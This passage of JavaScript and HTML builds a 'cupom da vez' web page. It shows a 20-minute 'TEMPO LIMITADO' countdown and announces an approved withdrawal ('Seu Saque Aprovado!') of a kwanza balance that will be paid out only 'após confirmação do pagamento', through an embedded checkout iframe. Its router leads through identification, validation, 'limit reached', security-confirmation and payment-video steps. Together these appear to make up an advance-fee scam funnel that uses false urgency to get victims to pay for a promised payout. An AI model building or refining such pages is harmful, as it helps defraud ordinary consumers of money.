    <header style="width:100%;padding:16px;display:flex;justify-content:center">
      <div style="display:flex;align-items:center">
        <h1 style="font-size:36px;font-weight:900;color:#000">cupom</h1>
        <div style="width:32px;height:32px;background:#facc15;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:4px"><span style="color:#000;font-weight:700;font-size:14px">$</span></div>
        <div style="margin-left:4px"><span style="font-size:14px;font-weight:500;color:#6b7280;display:block;line-height:1.1">DA VEZ</span></div>
      </div>
    </header>
    <main style="width:100%;max-width:448px;padding:16px;flex:1;display:flex;flex-direction:column;margin:0 auto">
      <div style="background:#dc2626;color:#fff;padding:16px;border-radius:12px;text-align:center;margin-bottom:24px;box-shadow:0 10px 15px rgba(0,0,0,.1)">
        <p style="font-weight:700;font-size:18px">TEMPO LIMITADO!</p>
        <p style="font-size:48px;font-weight:700;letter-spacing:4px;margin:8px 0" id="timer">20:00</p>
        <p style="font-size:14px">Complete seu checkout antes que o tempo acabe</p>
      </div>
      <div style="background:#dcfce7;border:2px solid #86efac;padding:24px;border-radius:12px;text-align:center;margin-bottom:24px;box-shadow:0 10px 15px rgba(0,0,0,.1)">
        <h2 style="font-size:24px;font-weight:700;color:#166534">Seu Saque Aprovado!</h2>
        <p style="font-size:36px;font-weight:700;color:#15803d;margin:16px 0;display:flex;align-items:center;justify-content:center">
          <span style="font-size:36px;margin-right:8px">💰</span>${fmtAOA(bal)}
        </p>
        <p style="font-size:14px;font-weight:500;color:#15803d">Valor será transferido após confirmação do pagamento</p>
      </div>
      <div style="border-radius:12px;overflow:hidden;box-shadow:0 4px 6px rgba(0,0,0,.1)">
        <div style="position:relative;width:100%;padding-top:375%">
          <iframe src="${checkoutUrl}" title="Checkout" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;border:none"></iframe>
        </div>
      </div>
    </main>
  </div></div>`;
  const timerEl = document.getElementById('timer');
  const iv = setInterval(() => {
    countdown--; if (countdown <= 0) { clearInterval(iv); countdown = 0; }
    const m = Math.floor(countdown / 60), s = countdown % 60;
    timerEl.textContent = String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
  }, 1000);
}

// ===== ROUTER =====
function handleRoute() {
  const r = getRoute();
  if (r === '/') renderHome();
  else if (r === '/identificacao') renderIdentificacao();
  else if (r.startsWith('/validacao/')) { renderValidacao(parseInt(r.split('/')[2])); }
  else if (r === '/limite-atingido') renderLimite();
  else if (r === '/metodo-saque') renderMetodoSaque();
  else if (r === '/confirmacao-seguranca') renderConfirmacao();
  else if (r === '/final') renderFinal();
  else if (r === '/video-pagamento') renderVideoPagamento();
  else if (r === '/checkout') renderCheckout();
  else renderHome();
  window.scrollTo(0, 0);
}
window.addEventListener('hashchange', handleRoute);
document.addEventListener('DOMContentLoaded', handleRoute);

